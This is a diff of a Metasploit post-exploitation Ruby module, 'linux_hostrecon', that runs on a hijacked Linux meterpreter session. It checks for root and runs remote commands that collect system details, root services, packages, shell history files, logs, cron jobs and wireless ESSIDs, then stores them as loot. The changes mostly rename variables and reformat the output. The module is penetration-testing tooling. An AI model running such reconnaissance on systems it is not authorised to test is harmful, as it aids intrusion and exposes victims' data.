@@ -99,7 +99,7 @@ class MetasploitModule < Msf::Post
                                         'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                 ],
  
-                        'Version'        => '$Revision: 1.1',
+                        'Version'        => '$Revision: 1.2',
                         'DisclosureDate' => 'set 17 2017',
                         'Platform'       => 'linux',
                         'Arch'           => 'x86_x64',
@@ -143,36 +143,28 @@ class MetasploitModule < Msf::Post
 # Running sellected modules against session target.
 #
 def run
+
   session = client
-
-
-      # Variable declarations (msf API calls)
-      sysnfo = session.sys.config.sysinfo
-      runtor = client.sys.config.getuid
-      runsession = client.session_host
-      directory = client.fs.dir.pwd
-
-
-    # Print banner and scan results on screen
-    print_line("")
-    print_line("    +--------------------------------------------+")
-    print_line("    |     * LINUX HOST RECON (FINGERPRINT) *     |")
-    print_line("    |            Author : r00t-3xp10it           |")
-    print_line("    +--------------------------------------------+")
-    print_line("")
-    print_line("    Running on session  : #{datastore['SESSION']}")
-    print_line("    Target Architecture : #{sysnfo['Architecture']}")
-    print_line("    Computer            : #{sysnfo['Computer']}")
-    print_line("    Target IP addr      : #{runsession}")
-    print_line("    Payload directory   : #{directory}")
-    print_line("    Operative System    : #{sysnfo['OS']}")
-    print_line("    Client UID          : #{runtor}")
-    print_line("")
-    print_line("")
+  #
+  # draw module banner ..
+  #
+  print_line("    +----------------------------+")
+  print_line("    |LINUX HOSTRECON POST-MODULE |")
+  print_line("    |   Author : r00t-3xp10it    |")
+  print_line("    +----------------------------+")
 
 
     #
-    # check for proper operative system (Linux)
+    # Variable declarations (msf API calls)
+    #
+    sys_info = session.sys.config.sysinfo
+    target_uid = client.sys.config.getuid
+    host_ip = client.session_host
+    payload_path = client.fs.dir.pwd
+    #
+    # check for proper target operative system (Linux)
+    # here we are using sysinfo['OS'] meterpreter module to check if target
+    # system its compatible with the exploit code (linux distros only)
     #
     unless sysinfo['OS'] =~ /Linux/ || sysinfo['OS'] =~ /linux/
       print_error("[ABORT]: This module only works againt Linux systems")
@@ -180,9 +172,11 @@ def run
     end
     #
     # Check if we are running in an higth integrity context (root)
+    # here we are using getuid API to check for root privileges 
     #
-    unless runtor =~ /uid=0/ || runtor =~ /root/
-      print_error("[ABORT]: root access is required ..")
+    target_uid = client.sys.config.getuid
+    unless target_uid =~ /uid=0/ || target_uid =~ /root/
+      print_error("[ABORT]: root access is required in target system ..")
       return nil
     end
     #
@@ -190,16 +184,16 @@ def run
     # the non-return of sysinfo command reveals that we are not on a meterpreter session!
     #
     if not sysinfo.nil?
-      print_status("Running module against: #{sysnfo['Computer']}")
+      print_status("Running module against: #{sys_info['Computer']}")
     else
       print_error("[ABORT]: This module only works in meterpreter sessions!")
       return nil
     end
 
 
+
       #
       # Dump system information from target system (fingerprints)
-      # TODO: write better outputs ..
       #
       data_dump=''
       print_status("Executing list of commands remotelly ..")
@@ -209,42 +203,46 @@ def run
       #
       date_out = cmd_exec("date")
       distro_uname = cmd_exec("uname -a")
-      distro_release = cmd_exec("cat /etc/*-release | grep \"DISTRIB_RELEASE=\"; cat /etc/*-release | grep \"DISTRIB_DESCRIPTION=\"; cat /etc/*-release | grep \"VERSION_ID=\"; cat /etc/*-release | grep \"ID_LIKE=\"")
-      distro_hardw = cmd_exec("lscpu | grep \"Architecture\"; lscpu | grep \"CPU op-mode\"; lscpu | grep \"Vendor ID\"")
-      shell_used = cmd_exec("echo $0")
-      shell_system = cmd_exec("echo \"$SHELL\"")
+      distro_release = cmd_exec("cat /etc/*-release | grep 'DISTRIB_RELEASE='; cat /etc/*-release | grep 'DISTRIB_DESCRIPTION='; cat /etc/*-release | grep 'VERSION_ID='; cat /etc/*-release | grep 'ID_LIKE='")
+      hardware_info = cmd_exec("lscpu | grep 'Architecture'; lscpu | grep 'CPU op-mode'; lscpu | grep 'Vendor ID'")
+      current_shell = cmd_exec("echo $0")
+      system_shell = cmd_exec("echo $SHELL")
       distro_shells = cmd_exec("grep '^[^#]' /etc/shells")
         #
         # Store data into an variable (data_dump) ..
         # to be able to write the logfile and display the outputs ..
         #
-        data_dump << date_out
-        data_dump << ""
-        data_dump << "UNAME:"
-        data_dump << "----------------"
-        data_dump << distro_uname
-        data_dump << ""
-        data_dump << "RELEASE:"
-        data_dump << "----------------"
+        data_dump << "[*]" + date_out
+        data_dump << "\n\n"
+        data_dump << "Running on session  : #{datastore['SESSION']}\n"
+        data_dump << "Target Architecture : #{sys_info['Architecture']}\n"
+        data_dump << "Computer            : #{sys_info['Computer']}\n"
+        data_dump << "Target IP addr      : #{host_ip}\n"
+        data_dump << "Payload directory   : #{payload_path}\n"
+        data_dump << "Operative System    : #{sys_info['OS']}\n"
+        data_dump << "DISTRO UNAME        : #{distro_uname}\n"
+        data_dump << "Client UID          : #{target_uid}\n"
+        data_dump << "\n\n"
+        data_dump << "HARDWARE INFO\n"
+        data_dump << "-------------\n"
+        data_dump << hardware_info
+        data_dump << "\n\n"
+        data_dump << "DISTRO RELEASE\n"
+        data_dump << "--------------\n"
         data_dump << distro_release
-        data_dump << ""
-        data_dump << "HARDWARE INFO:"
-        data_dump << "----------------"
-        data_dump << distro_hardw
-        data_dump << ""
-        data_dump << "SHELL IN USE:"
-        data_dump << "----------------"
-        data_dump << shell_used
-        data_dump << ""
-        data_dump << "DEFAULT SYSTEM SHELL:"
-        data_dump << "----------------"
-        data_dump << shell_system
-        data_dump << ""
-        data_dump << "AVAILABLE SHELLS:"
-        data_dump << "----------------"
+        data_dump << "\n\n"
+        data_dump << "CURRENT SHELL\n"
+        data_dump << "-------------\n"
+        data_dump << current_shell
+        data_dump << "\n\n"
+        data_dump << "DEFAULT SYSTEM SHELL\n"
+        data_dump << "--------------------\n"
+        data_dump << system_shell
+        data_dump << "\n\n"
+        data_dump << "AVAILABLE SHELLS\n"
+        data_dump << "----------------\n"
         data_dump << distro_shells
-        data_dump << ""
-        Rex::sleep(0.5)
+        data_dump << "\n\n"
 
 
         #
@@ -271,30 +269,30 @@ def run
             # store data into an variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
-            data_dump << "ROOT SERVICES RUNNING:"
-            data_dump << "----------------"
+            data_dump << "ROOT SERVICES RUNNING\n"
+            data_dump << "---------------------\n"
             data_dump << root_services
-            data_dump << ""
-            data_dump << "LIST OF PACKAGES FOUND:"
-            data_dump << "-----------------------"
+            data_dump << "\n\n"
+            data_dump << "LIST OF PACKAGES FOUND\n"
+            data_dump << "----------------------\n"
             data_dump << distro_packages
-            data_dump << ""
-            data_dump << "LIST OF HISTORY FILES:"
-            data_dump << "-----------------------"
+            data_dump << "\n\n"
+            data_dump << "LIST OF HISTORY FILES\n"
+            data_dump << "---------------------\n"
             data_dump << distro_history
-            data_dump << ""
-            data_dump << "LIST OF LOGFILES FOUND:"
-            data_dump << "-----------------------"
+            data_dump << "\n\n"
+            data_dump << "LIST OF LOGFILES FOUND\n"
+            data_dump << "----------------------\n"
             data_dump << distro_logs
-            data_dump << ""
-            data_dump << "CRONTAB TASKS:"
-            data_dump << "-----------------------"
+            data_dump << "\n\n"
+            data_dump << "CRONTAB TASKS\n"
+            data_dump << "-------------\n"
             data_dump << cron_tasks
-            data_dump << ""
-            data_dump << "LIST OF ESSIDs EMITING:"
-            data_dump << "-----------------------"
+            data_dump << "\n\n"
+            data_dump << "LIST OF ESSIDs EMITING\n"
+            data_dump << "----------------------\n"
             data_dump << essid_out
-            data_dump << ""
+            data_dump << "\n\n"
         end
 
 
@@ -316,11 +314,10 @@ def run
             # store data into an variable (data_dump) ..
             # to be able to write the logfile and display the outputs ..
             #
-            data_dump << ""
-            data_dump << "COMMAND EXECUTED: #{exec_bash}"
-            data_dump << "-----------------------"
+            data_dump << "COMMAND EXECUTED OUTPUT\n"
+            data_dump << "-----------------------\n"
             data_dump << single_comm
-            data_dump << ""
+            data_dump << "\n\n"
         end
 
        #
@@ -344,7 +341,6 @@ def run
        print_warning("Target fingerprints stored under: ~/.msf4/loot (folder)")
        store_loot("linux_hostrecon", "text/plain", session, data_dump, "linux_hostrecon.txt", "linux_hostrecon")
      end
-
 
    #
    # end of the 'def run()' funtion ..
